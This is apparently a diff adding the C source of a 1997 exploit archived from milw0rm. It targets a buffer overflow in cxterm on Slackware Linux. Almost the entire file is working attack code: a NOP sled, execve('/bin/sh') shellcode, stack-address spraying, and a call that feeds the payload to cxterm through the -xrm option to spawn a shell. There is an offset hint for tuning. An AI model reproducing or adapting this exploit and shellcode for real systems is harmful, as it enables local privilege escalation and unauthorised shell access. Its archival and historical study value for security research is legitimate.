@@ -1,0 +1,68 @@
+/*
+
+   cxterm buffer overflow exploit for Linux.  This code is tested on
+both Slackware 3.1 and 3.2.
+
+					Ming Zhang
+                                        mzhang@softcom.net
+*/
+#include <unistd.h> 
+#include <stdio.h> 
+#include <stdlib.h>
+#include <fcntl.h>
+   
+#define CXTERM_PATH "/usr/X11R6/bin/cxterm"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+#define NOP_SIZE 1
+char nop[] = "\x90";
+char shellcode[] = 
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_sp(void) {
+   __asm__("movl %esp,%eax");
+}
+   
+void main(int argc,char **argv)
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   int i,OffSet = DEFAULT_OFFSET;
+
+/* use a different offset if you find this program doesn't do the job */
+   if (argc>1) OffSet = atoi(argv[1]);
+
+   buff = malloc(2048);
+   if(!buff)
+   {
+      printf("Buy more RAM!\n");
+      exit(0);
+   }
+   ptr = buff;
+      
+   for (i = 0; i <= BUFFER_SIZE - strlen(shellcode) - NOP_SIZE;
+i+=NOP_SIZE) {
+        memcpy (ptr,nop,NOP_SIZE);
+        ptr+=NOP_SIZE; 
+   }
+
+   for(i=0;i < strlen(shellcode);i++)
+      *(ptr++) = shellcode[i];
+   
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_sp() + OffSet;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   (void) fprintf(stderr,  
+         "This bug is discovered by Ming Zhang
+(mzhang@softcom.net)\n");  
+    /* Don't need to set ur DISPLAY to exploit this one, cool huh? */
+    execl(CXTERM_PATH, "cxterm", "-xrm",buff, NULL);
+}
+
+// milw0rm.com [1997-05-14]
